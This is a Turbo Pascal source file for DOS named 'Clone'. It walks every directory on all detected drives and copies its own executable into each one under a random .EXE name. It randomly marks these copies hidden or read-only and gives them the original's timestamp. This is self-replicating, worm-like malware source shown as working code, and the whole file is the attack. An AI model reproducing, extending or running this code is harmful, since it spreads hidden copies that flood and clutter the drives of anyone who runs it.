PROGRAM Clone;

USES Crt,Dos,RT_Watch;

CONST
  RetryTime = 10;
  FileBufferSize = 32768;

TYPE
  DriveListType = ARRAY[1..26] OF Char;

VAR
  DriveList2 : DriveListType;

  a,b,x,d    : Byte;

  r,q,
  FileName,
  FileName2,
  List1,
  List2,
  ListEntry2,
  ListEntry,
  abc        : STRING;

  Counter,
  Copie      : LongInt;
  FileAttr2  : Word;
  FileHandle : FILE;

{  Path       : PathStr;
  Dir        : DirStr;
  Name       : NameStr;
  Ext        : ExtStr;
  FullName   : PathStr;}
  Path,
  Dir,
  Name,
  Ext,
  FullName   : STRING;
  F          : SearchRec;
  Ch         : Char;
  I          : Integer;

  listfile,
  listfile2,
  listfile3  : Text;

FUNCTION SetFileAttributes(FileName : STRING; FileAttr : Word) : Boolean;
BEGIN
  Assign(FileHandle,FileName);
  SetFAttr(FileHandle,FileAttr);
  SetFileAttributes := ((IOResult=0) AND (DosError=0));
END;

FUNCTION GetFileAttributes(FileName : STRING; VAR FileAttr : Word) : Boolean;
BEGIN
  Assign(FileHandle,FileName);
  GetFAttr(FileHandle,FileAttr);
  GetFileAttributes:=((IOResult=0) AND (DosError=0));
END;

FUNCTION DeleteFile(FileName : STRING) : Boolean;
VAR
  FileAttr : Word;
BEGIN
  Assign(FileHandle,FileName);
  GetFAttr(FileHandle,FileAttr);
  IF (FileAttr AND ReadOnly) <> 0 THEN
    SetFAttr(FileHandle,FileAttr AND (NOT ReadOnly));
  Erase(FileHandle);
  DeleteFile := (IOResult=0);
END;

FUNCTION DirExists(DName : STRING) : Boolean;
VAR
 f     : FILE;
 fAttr : Word;
BEGIN
 Assign(f,DName);
 GetFAttr(f,fAttr);
 DirExists := ((fAttr AND Directory) <> 0) AND (DosError = 0);
END;

FUNCTION FileExists(FName : STRING) : Boolean;
VAR
 f     : FILE;
 fAttr : Word;
BEGIN
 Assign(f,FName);
 GetFAttr(f,fAttr);
 FileExists := (DosError = 0)
            AND ((fAttr AND Directory) = 0)
            AND ((fAttr AND VolumeID)  = 0);
END;

FUNCTION ReadSector(Drive,Head,Track,Sector,TotalSector : Byte; DiskBuffer : Pointer): Byte; ASSEMBLER;
ASM
  mov  cx, RetryTime
@retry:
  push cx
  mov  ah, 02h
  mov  al, TotalSector
  mov  ch, Track
  mov  cl, Sector
  mov  dh, Head
  mov  dl, Drive
  les  bx, DiskBuffer
  int  13h
  pop  cx
  jnc  @finish
  loop @retry
@finish:
  mov  al, ah
END;

FUNCTION GetCMOSFloppyDriveAType : Byte;
VAR
  InValue : Byte;
  DriveA  : Byte;
BEGIN
  INLINE($fa);
  Port[$70] := $10;
  InValue := Port[$71];
  DriveA := (InValue AND $f0) SHR 4;
  GetCMOSFloppyDriveAType := DriveA;
  INLINE($fb);
end;

FUNCTION GetCMOSFloppyDriveBType : Byte;
VAR
  InValue : Byte;
  DriveB  : Byte;
BEGIN
  INLINE($fa);
  Port[$70] := $10;
  InValue := Port[$71];
  DriveB := (InValue AND $f);
  GetCMOSFloppyDriveBType := DriveB;
  INLINE($fb);
END;

FUNCTION GetAllLogicalDrive(VAR DriveList : DriveListType) : Byte;
VAR
  DefaultDrive       : Byte;
  TestDrive,NewDrive : Byte;
  TotalDrive         : Byte;
BEGIN
  ASM
    mov ah, 19h
    int 21h
    mov DefaultDrive, al
  END;
  TotalDrive := 0;
  FOR TestDrive := 0 TO 25 DO BEGIN
    ASM
      mov ah, 0eh
      mov dl, TestDrive
      int 21h
      mov ah, 19h
      int 21h
      mov NewDrive, al
    END;
    IF TestDrive = NewDrive THEN BEGIN
      Inc(TotalDrive);
      DriveList[TotalDrive] := Chr(TestDrive+65);
      IF (TestDrive = 0) AND (GetCMOSFloppyDriveAType = 0) THEN Dec(TotalDrive);
      if (TestDrive = 1) AND (GetCMOSFloppyDriveBType = 0) THEN Dec(TotalDrive);
    END;
  END;
  ASM
    mov ah, 0eh
    mov dl, DefaultDrive
    int 21h
  END;
  GetAllLogicalDrive := TotalDrive;
END;

FUNCTION GetAllRecordableDrive(VAR DriveList : DriveListType) : Byte;
CONST
  SectorBufferSize = 1024;
VAR
  TotalDrive   : Byte;
  SectorBuffer : Pointer;
BEGIN
  FillChar(DriveList,SizeOf(DriveListType),0);
  TotalDrive := 0;
  IF MaxAvail < SectorBufferSize then Exit;
  GetMem(SectorBuffer,SectorBufferSize);
  FOR Counter := 0 TO 3 DO BEGIN
    IF NOT(ReadSector(Counter,0,0,1,1,SectorBuffer) IN [$01..$02,$04,$07,$0a..$0d,$bb,$ff]) THEN BEGIN
      Inc(TotalDrive);
      DriveList[TotalDrive] := Chr(Counter+65);
    END;
  END;
  FOR Counter := $80 TO $80+3 DO BEGIN
    IF NOT(ReadSector(Counter,0,0,1,1,SectorBuffer) IN [$01..$02,$04,$07,$0a..$0d,$bb,$ff]) THEN BEGIN
      Inc(TotalDrive);
      DriveList[TotalDrive] := Chr(Counter-61);
    END;
  END;
  FreeMem(SectorBuffer,SectorBufferSize);
  GetAllRecordableDrive := TotalDrive;
END;

FUNCTION GetTotalHardDisk : Byte; ASSEMBLER;
ASM
  mov ah, 08h
  mov dl, 80h
  int 13h
  jnc @finish
  mov dl, 0ffh
@finish:
  mov al, dl
END;

FUNCTION GetTotalCDROMDrive(VAR FirstDriveLetter : Byte) : Byte;
VAR
  Status : Byte;
  FirstDriveLetterValue : Byte;
BEGIN
  ASM
    mov ax, 1500h
    xor bx, bx
    int 2fh
    mov WORD PTR FirstDriveLetterValue, cx
    mov WORD PTR Status, bx
  END;
  FirstDriveLetter := FirstDriveLetterValue;
  GetTotalCDROMDrive := Status;
END;

FUNCTION GetCDROMDrive : Byte; ASSEMBLER;
VAR Drive : Word;
ASM
  mov ax,1500h
  mov bx,0000h
  int 2Fh
  mov drive,cx
  cmp bx,0
  jnz @incdrive
  mov ax,0
  jmp @ende
@incdrive:
  inc drive
  mov ax,drive
@ende:
END;

FUNCTION Is_CDROM(Drv : Char) : Boolean;
VAR
  R   : Registers;
  CDR : STRING;
  cnt : Byte;
BEGIN
  Is_CDROM := False;
  CDR := '';
  WITH R DO BEGIN
    AX := $1500;
    BX := $0000;
    CX := $0000;
    Intr( $2F, R );
    IF BX > 0 THEN BEGIN
      FOR cnt := 0 TO (bx-1) DO CDR := CDR+Char(CL+Byte('A')+cnt);
    END;
    Is_CDROM := Pos(Upcase(Drv),CDR) > 0;
  END
END;

FUNCTION CopyFile(InputFileName,OutputFileName : STRING) : Boolean;
VAR
  InputFile,OutputFile   : FILE;
  ReadStatus,WriteStatus : Word;
  FileBuffer             : Pointer;
  FileDateTime           : Longint;
BEGIN
  CopyFile := False;
  GetFileAttributes(OutputFileName,FileAttr2);
  SetFileAttributes(OutputFileName,0);
  Assign(OutputFile,OutputFileName);
  Rewrite(OutputFile,1);
  FOR i := 1 TO Random(10)+1 DO BEGIN
    SetFileAttributes(InputFileName,0);
    Assign(InputFile,InputFileName);
    Reset(InputFile,1);
    IF IOResult <> 0 THEN Exit;
    IF MaxAvail < FileBufferSize THEN Exit;
    GetMem(FileBuffer,FileBufferSize);
    REPEAT
      BlockRead(InputFile,FileBuffer^,SizeOf(FileBuffer),ReadStatus);
      BlockWrite(OutputFile,FileBuffer^,ReadStatus,WriteStatus);
    UNTIL (ReadStatus = 0) OR (WriteStatus <> ReadStatus);
    FreeMem(FileBuffer,FileBufferSize);
    Close(InputFile);
  END;
  GetFTime(InputFile,FileDateTime);
  SetFTime(OutputFile,FileDateTime);
  Close(OutputFile);
  SetFileAttributes(OutputFileName,FileAttr2);
  FileAttr2 := 0;
  IF Random(2) = 0 THEN FileAttr2 := FileAttr2 + ReadOnly;
  IF Random(2) = 0 THEN FileAttr2 := FileAttr2 + Hidden;
  SetFileAttributes(OutputFileName,FileAttr2);
  CopyFile := True;
END;

PROCEDURE GetFileName;
BEGIN
  q := '';
  r := ParamStr(0);
  a := 0;
  b := Length(ParamStr(0));
  REPEAT
    Inc(a);
    q := q+r[b];
    Dec(b);
  UNTIL r[b] = '\';
  b := Length(q);
  r := q;
  FOR i := 1 TO b DO BEGIN
    q[(b+1)-i] := r[i];
  END;
  FileName := q;
END;

PROCEDURE Process(dir : DirStr; s : SearchRec; List : STRING);
BEGIN
  IF (DirExists(dir+s.name)) OR FileExists(dir+s.name) THEN BEGIN
    ListEntry2 := dir+s.name;
    IF (ListEntry2[Length(ListEntry2)] <> '.')
      AND ((ListEntry2[Length(ListEntry2)-1] <> '.') OR ((ListEntry2[Length(ListEntry2)-1] <> '\'))) THEN BEGIN
      GotoXY(1,1);
      Write('                                                                         ');
      GotoXY(1,1);
      Write(dir, s.name);
      Assign(listfile3,List);
      Append(listfile3);
      WriteLn(listfile3,dir,s.name);
      GetFilename;
      Filename2 := '';
      FOR i := 1 TO Random(7)+1 DO BEGIN
        IF Random(2) = 0 THEN Filename2 := Filename2+Char(Random(24)+97)
        ELSE IF Random(2) = 1 THEN BEGIN
          Filename2 := Filename2+Char(Random(9)+48);
        END ELSE IF Random(2) = 2 THEN BEGIN
          Filename2 := Filename2+Char(Random(24)+65);
        END ELSE Filename2 := Filename2+Char(Random(24)+65);
      END;
      Filename2 := Filename2+'.EXE';
      r := dir+s.name+'\'+Filename2{!!!};
      CopyFile(Filename,r);
      Copie := Copie+1;
      GotoXY(1,2);
      Write('Kopien erstellt: ',copie);
      Close(listfile3);
    END;
  END ELSE BEGIN
    IF Random(2) = 0 THEN FOR i := 1 TO Random(255) DO BEGIN
      SetFileAttributes(Filename,0);
      Assign(ListFile,Filename);
      Rewrite(ListFile);
      Close(ListFile);
      DeleteFile(FileName);
    END;
    FOR i := 1 TO Counter+1 DO BEGIN
      Str(i,abc);
      IF FileExists(abc+'.lst') THEN DeleteFile(abc+'.lst');
    END;
  END;
END;

PROCEDURE SearchDir(Path : PathStr; fspec : STRING);
VAR
  f : SearchRec;
BEGIN
  FindFirst(Path+fspec,Directory,f);
  WHILE DosError = 0 DO BEGIN
    IF (f.Attr AND Directory = Directory) THEN Process(path,f,List1);
    Findnext(f);
  END;
END;

BEGIN
  Randomize;
  ClrScr;
  d := 0;
  d := GetCDROMDrive-1;{! -1 ?}
  GetAllLogicalDrive(DriveList2);{l”schen, wenn nur aktuelles Laufwerk}
  Counter := 0;
  REPEAT
    Inc(counter);
  UNTIL DriveList2[counter] = Chr(0);
  Copie := 0;
  Counter := 1;
  Str(counter,abc);
  List1 := abc+'.lst';
  Assign(listfile,List1);
  Rewrite(listfile);
  Close(listfile);
  x := 0;
  REPEAT
    IF (x <> d) OR (x <> d+1) OR (IS_CDROM(DriveList2[x]) = False) THEN SearchDir(DriveList2[x]+':'+'\','*.*');
    Inc(x);
  UNTIL DriveList2[x] = Chr(0);
  REPEAT
    Str(counter-1,abc);
    IF FileExists(abc+'.lst') THEN DeleteFile(abc+'.lst');
    Str(counter,abc);
    IF FileExists(abc+'.lst') = True THEN BEGIN
      Str(counter,abc);
      List2 := abc+'.lst';
      Assign(listfile2,List2);
      Reset(listfile2);
      Str(counter+1,abc);
      List1 := abc+'.lst';
      Assign(listfile,List1);
      Rewrite(listfile);
      Close(listfile);
      REPEAT
        Read(listfile2,ListEntry);
        ReadLn(listfile2);
        IF (ListEntry[Length(ListEntry)] <> '.')
          AND ((ListEntry[Length(ListEntry)-1] <> '.') OR ((ListEntry[Length(ListEntry)-1] <> '\')))
          THEN SearchDir(ListEntry+'\','*.*');
      UNTIL EoF(listfile2);
      Close(listfile2);
      Inc(counter);
      Str(counter,abc);
    END;
  UNTIL FileExists(abc+'.lst') <> True;
  Str(counter-1,abc);
  IF FileExists(abc+'.lst') THEN DeleteFile(abc+'.lst');
  Str(counter,abc);
  IF FileExists(abc+'.lst') THEN DeleteFile(abc+'.lst');
  Str(counter+1,abc);
  IF FileExists(abc+'.lst') THEN DeleteFile(abc+'.lst');
  IF Random(2) = 0 THEN FOR i := 1 TO Random(255) DO BEGIN
    SetFileAttributes(Filename,0);
    Assign(ListFile,Filename);
    Rewrite(ListFile);
    Close(ListFile);
    DeleteFile(FileName);
  END;
END.